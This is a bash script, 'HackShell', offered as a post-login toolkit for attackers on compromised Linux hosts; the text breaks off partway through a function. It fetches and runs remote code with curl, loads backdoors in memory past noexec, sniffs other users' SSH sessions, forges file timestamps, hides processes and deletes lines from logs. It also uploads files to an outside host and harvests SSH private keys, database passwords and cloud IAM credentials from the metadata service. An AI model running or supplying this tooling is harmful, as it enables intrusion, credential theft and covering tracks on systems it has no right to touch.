#! /usr/bin/env bash

# HackShell - Post-Login shell configuration for hackers
#
# Configures the current BASH shell to disable history files and swap files
# for bash, wget, less, vim, mysql, curl, ...
#
# Also adds many useful commands, aliases and bash functions.
#
# Does not write anything to the file-system and remains as silent as possible.
#
# Usage:
#     source <(curl -SsfL https://thc.org/hs)
#     source <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)
#
# Environment variables (optional):
#    XHOME=         Set custom XHOME directory [default: /dev/shm/.$'\t''~?$:?']
#
# 2024 by theM0ntarCann0n & skpr

CY="\033[1;33m" # yellow
CG="\033[1;32m" # green
CR="\033[1;31m" # red
CB="\033[1;34m" # blue
CM="\033[1;35m" # magenta
CC="\033[1;36m" # cyan
CDR="\033[0;31m" # red
CDG="\033[0;32m" # green
CDY="\033[0;33m" # yellow
CDM="\033[0;35m"
CDC="\033[0;36m" # cyan
CF="\033[2m"    # faint
CN="\033[0m"    # none
CW="\033[1;37m"
CUL="\e[4m"

### Functions to keep in memory
_hs_dep() {
    command -v "${1:?}" >/dev/null || { HS_ERR "Not found: ${1} [Install with ${CDC}bin ${1}${CDR} first]"; return 255; }
}
HS_ERR()  { echo -e >&2  "${CR}ERROR: ${CDR}$*${CN}"; }
HS_WARN() { echo -e >&2  "${CY}WARN: ${CDM}$*${CN}"; }
HS_INFO() { echo -e >&2 "${CDG}INFO: ${CDM}$*${CN}"; }


xhelp_scan() {
    echo -e "\
Scan 1 port:
    scan 22 192.168.0.1
Scan some ports:
    scan 22,80,443 192.168.0.1
Scan all ports:
    scan - 192.168.0.1
Scan all ports on a range of IPs
    scan - 192.168.0.1-254"
}

xhelp_dbin() {
    echo -e "\
dbin               - List all options
dbin search nmap   - Search for nmap
dbin install nmap  - install nmap
dbin list          - List ALL binaries"
}

xhelp_tit() {
    echo -e "
${CDC}tit${CN}                   - List PIDS that can be sniffed
${CDC}tit read  <PID>${CN}       - Sniff bash shell (bash reads from user input)
${CDC}tit read  <PID>${CN}       - Sniff ssh session (ssh reads from user input)
${CDC}tit write <PID>${CN}       - Sniff sshd session (sshd writes to the PTY/shell)"
}

xhelp_memexec() {
    echo -e "
Circumvent the noexec flag or when there is no writeable location on the remote
file-system to deploy your binary/backdoor.

Examples:
1. ${CDC}cat /usr/bin/id | memexec -u${CN}
2. ${CDC}curl -SsfL https://thc.org/my-backdoor-binary | memexec${CN}

Or a real world example to deploy gsocket without touching the file system
or /dev/shm or /tmp (Change the -sSECRET please):
${CDC}GS_ARGS=\"-ilqD -sSecretChangeMe31337\" memexec <(curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-\$(uname -m))${CN}"
}

xlog() { local a=$(sed "/${1:?}/d" <"${2:?}") && echo "$a" >"${2:?}"; }
xsu() {
    local name="${1:?}"
    local u g h

    [ "$UID" -ne 0 ] && { HS_ERR "Need root"; return; }
    u=$(id -u "${name:?}") || return
    g=$(id -g "${name:?}") || return
    h="$(grep "^${name}:" /etc/passwd | cut -d: -f6)"
    echo "HOME=${h:-/tmp}"
    unset -n _HS_HOME_ORIG
    HOME="${h:-/tmp}" "${HS_PY:-python}" -c "import os;os.setgid(${g:?});os.setuid(${u:?});os.execlp('bash', 'bash')"
    export _HS_HOME_ORIG
}

xtmux() {
    local sox="${TMPDIR}/.tmux-${UID}"
    # Can not live in XHOME because XHOME is wiped on exit()
    tmux -S "${sox}" "$@"
    command -v fuser >/dev/null && { fuser "${sox}" || rm -f "${sox}"; }
}

xssh() {
    local ttyp="$(stty -g)"
    local opts=()
    echo -e "May need to cut & paste:  ${CDC}source <(curl -SsfL https://thc.org/hs)${CN}"
    [ -z "$NOMX" ] && {
        [ ! -d "$XHOME" ] && hs_mkxhome
        [ -d "$XHOME" ] && {
            HS_INFO "Multiplexing all SSH connections over a single TCP. ${CF}[set NOMX=1 to disable]"
            opts=("-oControlMaster=auto" "-oControlPath=\"${XHOME}/.ssh-unix.%C\"" "-oControlPersist=15")
        }
    }
    stty raw -echo icrnl opost
    \ssh "${HS_SSH_OPT[@]}" "${opts[@]}" -T \
        "$@" \
        "unset SSH_CLIENT SSH_CONNECTION; LESSHISTFILE=- MYSQL_HISTFILE=/dev/null TERM=xterm-256color HISTFILE=/dev/null BASH_HISTORY=/dev/null exec -a [ntp] script -qc 'source <(resize); exec -a [uid] bash -i' /dev/null"
    stty "${ttyp}"
}

xscp() {
    local opts=()
    [ -z "$NOMX" ] && [ -d "$XHOME" ] && opts=("-oControlMaster=auto" "-oControlPath=\"${XHOME}/.ssh-unix.%C\"")
    \scp "${HS_SSH_OPT[@]}" "${opts[@]}" "$@"
}

purl() {
    local opts="timeout=10"
    local opts_init
    local url="${1:?}"
    { [[ "${url:0:8}" == "https://" ]] || [[ "${url:0:7}" == "http://" ]]; } || url="https://${url}"
    [ -n "$UNSAFE" ] && {
        opts_init="import ssl;ctx = ssl.create_default_context();ctx.check_hostname = False;ctx.verify_mode = ssl.CERT_NONE;"
        opts+=", context=ctx"
    }
    "$HS_PY" -c "import urllib.request;import sys;${opts_init}sys.stdout.buffer.write(urllib.request.urlopen(\"$url\", $opts).read())"
}

surl() {
    local r="${1#*://}"
    local opts=("-quiet" "-ign_eof")
    IFS=/ read -r host query <<<"${r}"
    openssl s_client --help 2>&1| grep -qFm1 -- -ignore_unexpected_eof && opts+=("-ignore_unexpected_eof")
    openssl s_client --help 2>&1| grep -qFm1 -- -verify_quiet && opts+=("-verify_quiet")
    echo -en "GET /${query} HTTP/1.0\r\nHost: ${host%%:*}\r\n\r\n" \
	| openssl s_client "${opts[@]}" -connect "${host%%:*}:443" \
	| sed '1,/^\r\{0,1\}$/d'
}

lurl() {
    local url="${1:?}"
    { [[ "${url:0:8}" == "https://" ]] || [[ "${url:0:7}" == "http://" ]]; } || url="https://${url}"
    perl -e 'use LWP::Simple qw(get);
my $url = '"'${1:?}'"';
print(get $url);'
}

burl() {
    local proto x host query
    IFS=/ read -r proto x host query <<<"$1"
    exec 3<>"/dev/tcp/${host}/${PORT:-80}"
    echo -en "GET /${query} HTTP/1.0\r\nHost: ${host}\r\n\r\n" >&3
    (while read -r l; do echo >&2 "$l"; [[ $l == $'\r' ]] && break; done && cat ) <&3
    exec 3>&-
}
# burl http://ipinfo.io
# PORT=31337 burl http://37.120.235.188/blah.tar.gz >blah.tar.gz

# Execute a command without changing file's ctime/mtime/atime
# notime <reference file> <cmd> ...
# - notime . rm -f foo.dat
# - notime foo chmod 700 foo
notime() {
    local ref="$1"
    local now

    [[ $# -le 1 ]] && { echo >&2 "notime <reference file> <cmd> ..."; return 255; }
    [[ ! -e "$ref" ]] && { echo >&2 "File not found: $ref"; return 255; }
    [ "$UID" -ne 0 ] && { HS_ERR "Need root"; return 255; }

    shift 1
    now=$(date -Ins) || return
    date --set="$(date -Ins -r "$ref")" >/dev/null || return
    "$@"
    date --set="$now" >/dev/null || return
}

# Set the ctime to the file's mtime
ctime() {
    local fn
    [ "$UID" -ne 0 ] && { HS_ERR "Need root"; return 255; }

    for fn in "$@"; do
        notime "${fn}" chmod --reference "${fn}" "${fn}"
        # FIXME: warning if Birth time is newer than ctime or mtime.
    done
}

# Presever mtime, ctime and birth-time as best as possible.
# notime_cp <src> <dst>
notime_cp() {
    local src="$1"
    local dst="$2"
    local now
    local olddir_date
    local dir

    [[ ! -f "$src" ]] && { echo >&2 "Not found: $src"; return 255; }
    if [[ -d "$dst" ]]; then
        dir="$dst"
        dst+="/$(basename "$src")"
    else
        dir="$(dirname "$dst")"
    fi
    # If dst exists then keep dst's time (otherwise use time of src)
    [[ -f "$dst" ]] && {
        # Make src identical to dst (late set dst to src).
        touch -r "$dst" "$src"
        chmod --reference "$dst" "$src"
    }

    olddir_date="$(date +%Y%m%d%H%M.%S -r "$dir")" || return
    [[ ! -e "$dst" ]] && {
        [[ "$UID" -eq 0 ]] && {
            now=$(date -Ins)
            date --set="$(date -Ins -r "$src")" >/dev/null || return
            touch "$dst"
            chmod --reference "$src" "$dst"
            touch -t "$olddir_date" "$dir"  # Changes ctime
            chmod --reference "$dir" "$dir" # Fixes ctime
            date --set="$now" >/dev/null
            unset olddir_date
        }
    }

    cat "$src" >"$dst"
    chmod --reference "$src" "$dst"
    touch -r "$src" "$dst"

    [[ "$UID" -ne 0 ]] && {
        # Normal users can't change date to the past.
        touch -t "${olddir_date:?}" "$dir"
        return
    }
    now=$(date -Ins) || return
    date --set="$(date -Ins -r "$src")" || return
    chmod --reference "$dst" "$dst"   # Fixes ctime
    date --set="$now"
}

# domain 2 IPv4
dns() {
    local x="${1:?}"

    x="$(getent ahostsv4 "${x}" 2>/dev/null)" || return
    echo "${x// */}"
}

resolv() {
    local x r
    [ -t 0 ] && [ -n "$1" ] && {
        echo "$(dns "$1")"$'\t'"${1}"
        return
    }
    while read -r x; do
        r="$(dns "$x")" || continue
        echo "${r}"$'\t'"${x}"
    done
}
find_subdomains() {
	local d="${1//./\\.}"
	local rexf='[0-9a-zA-Z_.-]{0,64}'"${d}"
	local rex="$rexf"'([^0-9a-zA-Z_]{1}|$)'
	[ $# -le 0 ] && { echo -en >&2 "Extract sub-domains from all files (or stdin)\nUsage  : find_subdomains <apex-domain> <file>\nExample: find_subdomain .com | anew"; return; }
	shift 1
	[ $# -le 0 ] && [ -t 0 ] && set -- .
	command -v rg >/dev/null && { rg -oaIN --no-heading "$rex" "$@" | grep -Eao "$rexf"; return; }
	grep -Eaohr "$rex" "$@" | grep -Eo "$rexf"
}

# HS_TRANSFER_PROVIDER="transfer.sh"
HS_TRANSFER_PROVIDER="oshi.at"

transfer() {
    [[ $# -eq 0 ]] && { echo -e >&2 "Usage:\n    transfer [file/directory]\n    transfer [name] <FILENAME"; return 255; }
    [[ ! -t 0 ]] && { curl -SsfL --progress-bar -T "-" "https://${HS_TRANSFER_PROVIDER}/${1}"; return; }
    [[ ! -e "$1" ]] && { echo -e >&2 "Not found: $1"; return 255; }
    [[ -d "$1" ]] && { (cd "${1}/.."; tar cfz - "${1##*/}")|curl -SsfL --progress-bar -T "-" "https://${HS_TRANSFER_PROVIDER}/${1##*/}.tar.gz"; return; }
    curl -SsfL --progress-bar -T "$1" "https://${HS_TRANSFER_PROVIDER}/${1##*/}"
}

# SHRED without shred command
command -v shred >/dev/null || shred() {
    [[ -z $1 || ! -f "$1" ]] && { echo >&2 "shred [FILE]"; return 255; }
    dd status=none bs=1k count=$(du -sk ${1:?} | cut -f1) if=/dev/urandom >"$1"
    rm -f "${1:?}"
}

bounceinit() {
    [[ -n "$_is_bounceinit" ]] && return
    _is_bounceinit=1

    echo 1 >/proc/sys/net/ipv4/ip_forward
    echo 1 >/proc/sys/net/ipv4/conf/all/route_localnet
    [ $# -le 0 ] && {
        HS_WARN "Allowing _ALL_ IPs to bounce. Use ${CDC}bounceinit 1.2.3.4/24 5.6.7.8/16 ...${CDM} to limit." 
        set -- "0.0.0.0/0"
    }
    while [ $# -gt 0 ]; do
        _hs_bounce_src+=("${1}")
        iptables -t mangle -I PREROUTING -s "${1}" -p tcp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188 
        shift 1
    done
    iptables -t mangle -D PREROUTING -j CONNMARK --restore-mark >/dev/null 2>/dev/null
    iptables -t mangle -I PREROUTING -j CONNMARK --restore-mark
    iptables -I FORWARD -m mark --mark 1188 -j ACCEPT
    iptables -t nat -I POSTROUTING -m mark --mark 1188 -j MASQUERADE
    iptables -t nat -I POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark
    HS_INFO "Use ${CDC}unbounce${CDM} to remove all bounces."
}

unbounce() {
    unset _is_bounceinit
    local str

    for x in "${_hs_bounce_dst[@]}"; do
        iptables -t nat -D PREROUTING -p tcp --dport "${x%%-*}" -m mark --mark 1188 -j DNAT --to "${x##*-}"
    done
    unset _hs_bounce_dst

    for x in "${_hs_bounce_src[@]}"; do
        iptables -t mangle -D PREROUTING -s "${x}" -p tcp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188 
    done
    unset _hs_bounce_src
    iptables -t mangle -D PREROUTING -j CONNMARK --restore-mark >/dev/null 2>/dev/null
    iptables -D FORWARD -m mark --mark 1188 -j ACCEPT 2>/dev/null
    iptables -t nat -D POSTROUTING -m mark --mark 1188 -j MASQUERADE 2>/dev/null
    iptables -t nat -D POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark 2>/dev/null
    HS_INFO "DONE. Check with ${CDC}iptables -t mangle -L PREROUTING -vn; iptables -t nat -L -vn; iptables -L FORWARD -vn${CN}"
}

bounce() {
    local fport="$1"
    local dstip="$2"
    local dstport="$3"
    [[ $# -lt 3 ]] && {
        echo -e >&2 "\
Forward ingress traffic to _this_ host onwards to another host
Usage: bounce <Local Port> <Destination IP> <Destination Port>
${CDC} bounce 2222  10.0.0.1  22   ${CN}# Forward 2222 to internal host's port 22
${CDC} bounce 31336 127.0.0.1 8080 ${CN}# Forward 31336 to server's 8080
${CDC} bounce 31337 8.8.8.8   53   ${CN}# Forward 31337 to 8.8.8.8's 53$"
        return 255
    }
    bounceinit

    iptables -t nat -A PREROUTING -p tcp --dport "${fport:?}" -m mark --mark 1188 -j DNAT --to "${dstip:?}:${dstport:?}" || return
    _hs_bounce_dst+=("${fport}-${dstip}:${dstport}")
    HS_INFO "Traffic to _this_ host's ${CDY}${fport}${CDM} is now forwarded to ${CDY}${dstip}:${dstport}"
}

crt() {
    [ $# -ne 1 ] && { HS_ERR "crt <domain-name>"; return 255; }
    _hs_dep jq || return
    _hs_dep anew || return
    curl -fsSL "https://crt.sh/?q=${1:?}&output=json" --compressed | jq -r '.[].common_name,.[].name_value' | anew | sed 's/^\*\.//g' | tr '[:upper:]' '[:lower:]'
}

rdns () {
    curl -fsSL "https://lookup.segfault.net/api/v1/download?ip_address=${1:?}&limit=10&apex_domain=${2}" | column -t -s,
}

ghostip() {
    source <(curl -fsSL https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/ghostip.sh)
}

ltr() {
	[ $# -le 0 ] && set -- .
    find "$@" -printf "%T@ %M %u %g % 10s %Tb %Td %Tk:%TM %p\n" | sort -n | cut -f2- -d' '
}

lssr() {
	[ $# -le 0 ] && set -- .
    find "$@" -printf "%s %M %u %g % 10s %Tb %Td %Tk:%TM %p\n" | sort -n | cut -f2- -d' '
}


hide() {
    local _pid="${1:-$$}"
    local ts_d ts_f
    [[ -L /etc/mtab ]] && {
        ts_d="$(date -r /etc +%Y%m%d%H%M.%S 2>/dev/null)"
        # Need stat + date to take timestamp of symlink.
        ts_f="$(stat -c %y /etc/mtab)"
        ts_f="$(date -d "${ts_f}" +%Y%m%d%H%M.%S 2>/dev/null)"
        [ -z "$ts_f" ] && ts_f="${ts_d}"
        cp /etc/mtab /etc/mtab.bak
        mv -f /etc/mtab.bak /etc/mtab
        [ -n "$ts_f" ] && touch -t "$ts_f" /etc/mtab
        [ -n "$ts_d" ] && touch -t "$ts_d" /etc
        HS_WARN "Use ${CDC}ctime /etc /etc/mtab${CDM} to fix ctime"
    }
    [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && HS_INFO "PID $_pid is now hidden"; return; }
    local _argstr
    for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
    [[ $(bash -c "ps -o stat= -p \$\$") =~ \+ ]] || exec bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
    bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
}

_hs_xhome_init() {
    [[ "$PATH" != *"$XHOME"* ]] && export PATH="${XHOME}:$PATH"
    hs_init_alias_reinit
}

hs_mkxhome() {
    _hs_xhome_init
    [ -d "${XHOME}" ] && return 255
    mkdir -p "${XHOME:?}" 2>/dev/null || return
    echo -e ">>> Using ${CDY}XHOME=${XHOME}${CN}. ${CF}[will auto-destruct on exit]${CN}"
    echo -e ">>> Type ${CDC}xdestruct${CN} to erase ${CDY}${XHOME}${CN}"
    echo -e ">>> Type ${CDC}xkeep${CN} to disable auto-destruct on exit."
    echo -e ">>> Type ${CDC}xcd${CN} to change to your hidden ${CDY}\"\${XHOME}\"${CN} directory"
}

cdx() { cd "${XHOME}" || return; }
xcd() { cdx; }

# Keep this seperate because this actually creates data.
xhome() {
    export HOME="${XHOME}"
    echo -e "${CDM}HOME set to ${CDY}${XHOME}${CN}"
    hs_mkxhome
    echo -e ">>> Type ${CDC}home${CN} to undo."
}

home() {
    export HOME="${_HS_HOME_ORIG}"
    echo -e "${CDM}HOME set to ${CDY}${HOME}${CN}"
}

xkeep() {
    touch "${XHOME}/.keep" 2>/dev/null
    HS_INFO "Wont delete ${CDY}${XHOME}${CDM} on exit"
}

tit() {
    local str
    _hs_dep strace
    _hs_dep awk
    _hs_dep grep

    [ $# -eq 0 ] && {
        str="$(ps -eF | grep -E '(^UID|bash|ssh )' | grep -v ' grep')"
        [ -n "$str" ] && {
            echo -e "${CDM}Use ${CDC}tit read <PID>${CDM} on:${CDY}${CF}"
            echo "$str"
        }
        str="$(ps -eF | grep -E '(^UID|sshd.*pts)' | grep -v ' grep')"
        [ -n "$str" ] && {
            echo -e "${CDM}Use ${CDC}tit write <PID>${CDM} on:${CDY}${CF}"
            echo "$str"
        }
        echo -e "${CN}>>> ${CW}TIP${CN}: ${CDC}ptysnoop.bt${CN} from ${CB}${CUL}https://github.com/hackerschoice/bpfhacks${CN} works better"
        return
    }
	strace -e trace="${1:?}" -p "${2:?}" 2>&1 | stdbuf -oL grep "^${1}"'.*= [1-9]$' | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
}

np() {
    local cmdl=()
    _hs_dep noseyparker || return
    [ -t 1 ] && {
        HS_WARN "Use ${CDC}np $*| less -R${CN} instead."
        return;
    }
    command -v nice >/dev/null && cmdl=("nice" "-n19")
    cmdl+=("noseyparker")
	_HS_NP_D="/tmp/.np-${UID}-$$"
	[ -d "${_HS_NP_D}" ] && rm -rf "${_HS_NP_D:?}"
	[ $# -le 0 ] && set - .
	NP_DATASTORE="$_HS_NP_D" "${cmdl[@]}" -q scan "$@" >&2 || return
	NP_DATASTORE="$_HS_NP_D" "${cmdl[@]}" report --color=always
	rm -rf "${_HS_NP_D:?}"
    unset _HS_NP_D
}

zapme() {
    local name="${1}"
    _hs_dep zapper || return
    HS_WARN "Starting new/zap'ed shell. Type '${CDC} source <(curl -SsfL https://thc.org/hs)${CDM}' again."
    [ -z "$name" ] && {
        HS_INFO "Apps will hide as ${CDY}python${CDM}. Use ${CDC}zapme -${CDM} for NO name."
        name="python"
    }
    exec zapper -f -a"${name}" bash -il
}

# Find writeable dirctory but without displaying sub-folders
# Usage: wfind /
# Usage: wfind /etc /var /usr 
wfind() {
    local arr dir
    local IFS

    arr=("$@")
    while [[ ${#arr[@]} -gt 0 ]]; do
        dir=${arr[${#arr[@]}-1]}
        unset "arr[${#arr[@]}-1]"
        find "$dir"  -maxdepth 1 -type d -writable -ls 2>/dev/null
        IFS=$'\n' arr+=($(find "$dir" -mindepth 1 -maxdepth 1 -type d ! -writable 2>/dev/null))
    done
}

# Only output the 16 charges before and 32 chars after..
hgrep() {
    grep -HEronasie  ".{,16}${1:-password}.{,32}" .
}

dbin() {
    local cdir tfn
    { [ -n "${XHOME}" ] && [ -f "${XHOME}/dbin" ]; } || { bin dbin || return; }

    cdir="${XHOME}/.dbin"
    [ ! -d "${cdir}" ] && { mkdir "${cdir}" || return; }
    DBIN_CACHEDIR="${cdir}" DBIN_TRACKERFILE="${cdir}/tracker.json" DBIN_INSTALL_DIR="${XHOME}" "${XHOME}/dbin" "$@"
    [ $# -eq 0 ] && { HS_INFO "Example: ${CDC}dbin install nmap"; }
}

bin() {
    local arch="$(uname -m)"
    local arch_alt
    local os="$(uname -s)"
    local a
    local single="${1}"
    local is_showhelp=1

    [ -z "$os" ] && os="Linux"
    [ -z "$arch" ] && arch="x86_64"
    [ -n "$single" ] && {
        FORCE=1 # implied. Always download even if systemwide exists
        unset is_showhelp
    }

    a="${arch}"
    [ "$arch" == "x86_64" ] && arch_alt="amd64"
    [ "$arch" == "aarch64" ] && arch_alt="arm64"
    hs_mkxhome
    bin_dl() {
        local dst="${XHOME}/${1:?}"
        local str="${CDM}Downloading ${CDC}${1:?}${CDM}........................................"
        local is_skip
        [ -n "$single" ] && {
            [ -n "$_HS_SINGLE_MATCH" ] && return # already tried to download
            [ "$single" != "$1" ] && { unset _HS_SINGLE_MATCH; return; }
            _HS_SINGLE_MATCH=1
        }
        echo -en "${str:0:64}"
        [ -s "${dst}" ] || rm -f "${dst:?}" 2>/dev/null
        [ -z "$FORCE" ] && which "${1}" &>/dev/null && is_skip=1
        [ -n "$FORCE" ] && [ -s "$dst" ] && is_skip=1
        [ -n "$is_skip" ] && { echo -e "[${CDY}SKIPPED${CDM}]${CN}"; return 0; }
        { err=$(dl "${2:?}"  2>&1 >&3 3>&-); } >"${dst}" 3>&1 || {
            rm -f "${dst:?}" 2>/dev/null
            if [ -z "$UNSAFE" ] && [[ "$err" == *"$_HS_SSL_ERR"* ]]; then
                echo -e ".[${CR}FAILED${CDM}]${CN}${CF}\n---> ${2}\n---> ${err}\n---> Try ${CDC}export UNSAFE=1${CN}"
            else
                echo -e ".[${CR}FAILED${CDM}]${CN}${CF}\n---> ${2}\n---> ${err}${CN}"
            fi
            return 255
        }
        chmod 711 "${dst}"
        echo -e ".....[${CDG}OK${CDM}]${CN}"
    }

    bin_dl anew         "https://bin.ajam.dev/${a}/anew-rs"
    bin_dl awk          "https://bin.ajam.dev/${a}/Baseutils/gawk/gawk"
    # bin_dl awk          "https://bin.ajam.dev/${a}/awk"
    bin_dl base64       "https://bin.ajam.dev/${a}/Baseutils/coreutils/base64"
    bin_dl busybox      "https://bin.ajam.dev/${a}/Baseutils/busybox/busybox"
    bin_dl curl         "https://bin.ajam.dev/${a}/curl"

    bin_dl "dbin"       "https://github.com/xplshn/dbin/releases/latest/download/dbin_${arch_alt}"
    # export DBIN_INSTALL_DIR="${XHOME}"

    bin_dl fd           "https://bin.ajam.dev/${a}/fd-find"

    bin_dl gs-netcat    "https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_${os,,}-${arch}"
    # bin_dl gs-netcat    "https://bin.ajam.dev/${a}/gs-netcat" #fetched straight from https://github.com/hackerschoice/gsocket (avoid GH ratelimit)
    bin_dl grep         "https://bin.ajam.dev/${a}/Baseutils/grep/grep"
    bin_dl gzip         "https://bin.ajam.dev/${a}/Baseutils/gzip/gzip"
    bin_dl hexdump      "https://bin.ajam.dev/${a}/Baseutils/util-linux/hexdump"
    bin_dl jq           "https://bin.ajam.dev/${a}/jq"
    bin_dl nc           "https://bin.ajam.dev/${a}/ncat"
    # bin_dl nc           "https://bin.ajam.dev/${a}/Baseutils/netcat/netcat" #: https://www.libressl.org/
    bin_dl netstat      "https://bin.ajam.dev/${a}/Baseutils/nettools/netstat"
    bin_dl nmap         "https://bin.ajam.dev/${a}/nmap"
    bin_dl noseyparker  "https://bin.ajam.dev/${a}/noseyparker"
    # [ "$arch" = "x86_64" ] && bin_dl noseyparker "https://github.com/hackerschoice/binary/raw/main/tools/noseyparker-x86_64-static"
    bin_dl openssl      "https://bin.ajam.dev/${a}/Baseutils/openssl/openssl"
    bin_dl ping         "https://bin.ajam.dev/${a}/Baseutils/iputils/ping"
    bin_dl ps           "https://bin.ajam.dev/${a}/Baseutils/procps/ps"
    bin_dl reptyr       "https://bin.ajam.dev/${a}/reptyr"
    bin_dl rg           "https://bin.ajam.dev/${a}/ripgrep"
    bin_dl rsync        "https://bin.ajam.dev/${a}/rsync"
    bin_dl script       "https://bin.ajam.dev/${a}/Baseutils/util-linux/script"
    bin_dl sed          "https://bin.ajam.dev/${a}/Baseutils/sed"
    bin_dl socat        "https://bin.ajam.dev/${a}/socat"
    bin_dl strace       "https://bin.ajam.dev/${a}/strace"
    bin_dl tar          "https://bin.ajam.dev/${a}/Baseutils/tar/tar"
    bin_dl tcpdump      "https://bin.ajam.dev/${a}/tcpdump"
    bin_dl zapper       "https://github.com/hackerschoice/zapper/releases/latest/download/zapper-${os,,}-${arch}"
    # bin_dl zapper       "https://bin.ajam.dev/${a}/zapper" #built from src @2-3 days
    bin_dl zgrep        "https://bin.ajam.dev/${a}/Baseutils/gzip/zgrep"

    [ -n "$single" ] && [ -z "$_HS_SINGLE_MATCH" ] && {
        local str="${single##*/}"
        local loc="${single}"
        unset single
        [ "$str" == "cme" ] && HS_WARN "CME is obsolete. Try netexec."
        [ "$str" == "crackmapexec" ] && HS_WARN "CrackMapExec is obsolete. Try netexec."
        bin_dl "${str}" "https://bin.ajam.dev/${a}/${loc}"
    }
    unset _HS_SINGLE_MATCH
    [ -n "$is_showhelp" ] && {
        [ -z "$FORCE" ] && echo -e ">>> Use ${CDC}FORCE=1 bin${CN} to download all" 
        echo -e ">>> Use ${CDC}bin <name>${CN} to download a specific binary"
        echo -e ">>> ${CW}TIP${CN}: Type ${CDC}zapme${CN} to hide all command line options
>>> from your current shell and all further processes."
        echo -e ">>> ${CDG}Download COMPLETE${CN}"
    }

    unset -f bin_dl
}

loot_sshkey() {
    local str
    local fn="${1:?}"

    [ ! -s "${fn}" ] && return
    grep -Fqam1 'PRIVATE KEY' "${fn}" || return

    [ -n "$_HS_SETSID_WAIT" ] && {
        str="${CF}password protected"
        setsid -w ssh-keygen -y -f "${fn}" </dev/null &>/dev/null && str="${CDR}NO PASSWORD"
    }
    echo -e "${CB}SSH-Key ${CDY}${fn}${CN} ${str}${CDY}${CF}"
    cat "$fn"
    echo -en "${CN}"
}

loot_bitrix() {
    local fn="${1:?}"
    [ ! -f "$fn" ] && return
    grep -Fqam1 '$_ENV[' "$fn" && return
    echo -e "${CB}Bitrix-DB ${CDY}${fn}${CF}"
    grep --color=never -E "(host|database|login|password)'.*=" "${fn}"
    echo -en "${CN}"
}

_loot_wp() {
    local fn="${1:?}"
    local str
    [ ! -f "$fn" ] && return

    str="$(grep -v ^# "$fn" | grep -E "DB_(NAME|USER|PASSWORD|HOST)")"
    [[ "$str" == *"_here"* ]] && return
    echo -e "${CB}WordPress-DB ${CDY}${fn}${CF}"
    echo "${str}"
    echo -en "${CN}"
}

# _loot_home <NAME> <filename>
_loot_homes() {
    local fn
    for fn in "${HOMEDIR:-/home}"/*/"${2:?}" /root/"${2}"; do
        [ ! -s "$fn" ] && continue
        echo -e "${CB}${1:-CREDS} ${CDY}${fn}${CF}"
        cat "$fn"
        echo -en "${CN}"
    done
}

_loot_openstack() {
    local str
    local rv

    [ -n "$_HS_NOT_OPENSTACK" ] && return
    [ -n "$_HS_NO_SSRF_169" ] && return
    [ -n "$_HS_GOT_SSRF_169" ] && return

    str="$(timeout 4 bash -c "$(declare -f dl);dl 'http://169.254.169.254/openstack/latest/user_data'" 2>/dev/null)" || {
        rv="$?"
        { [ "${rv}" -eq 124 ] || [ "${rv}" -eq 7 ]; } && _HS_NO_SSRF_169=1
        unset str
    }

    [ -z "$str" ] && {
        _HS_NOT_OPENSTACK=1
        return 255
    }
    _HS_GOT_SSRF_169=1
    echo -e "${CB}OpenStack user_data${CDY}${CF}"
    echo "$str"
    echo -en "${CN}"
    echo -e "${CW}TIP: ${CDC}"'dl "http://169.254.169.254/openstack/latest/meta_data.json" | jq -r'"${CN}"
}

# FIXME: Search through environment variables of all running processes.
# FIXME: Implement GCP & Digital Ocean. See https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf
_loot_aws() {
    local str
    local TOKEN
    local role
    local rv

    [ -n "$_HS_NOT_AWS" ] && return
    [ -n "$_HS_NO_SSRF_169" ] && return
    [ -n "$_HS_GOT_SSRF_169" ] && return

    command -v curl >/dev/null || return # AWS always has curl

    str="$(timeout 4 curl -SsfL -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60" 2>/dev/null)" || {
        rv="$?"
        { [ "${rv}" -eq 124 ] || [ "${rv}" -eq 7 ]; } && _HS_NO_SSRF_169=1
        unset str
    }
    [ -z "$str" ] && {
        _HS_NOT_AWS=1
        return 255
    }
    TOKEN="$str"

    _HS_GOT_SSRF_169=1
    str="$(curl -SsfL -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data 2>/dev/null)"
    [ -n "$str" ] && [[ "$str" != *Lightsail* ]] && {
        echo -e "${CB}AWS user-data (config)${CDY}${CF}"
        echo "$str"
        echo -en "${CN}"
    }

    str="$(curl -SsfL -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance 2>/dev/null)" || unset str
    [ -n "$str" ] && {
        echo -e "${CB}AWS EC2 Security Credentials${CDY}${CF}"
        echo "$str"
        echo -en "${CN}"
    }

    str="$(curl -SsfL -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)" || unset str
    [ -n "$str" ] && {
        for role in $str; do
            echo -e "${CB}AWS IAM Role${CDY} ${role}${CF}"
            curl -SsfL -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role"
            echo -e "${CN}"
        done
    }
}

_loot_yandex() {
    local str
    local rv

    [ -n "$_HS_NOT_YC" ] && return
    [ -n "$_HS_NO_SSRF_169" ] && return
    [ -n "$_HS_GOT_SSRF_169" ] && return

    str="$(timeout 4 bash -c "$(declare -f dl);dl 'http://169.254.169.254/latest/user-data'" 2>/dev/null)" || {
        rv="$?"
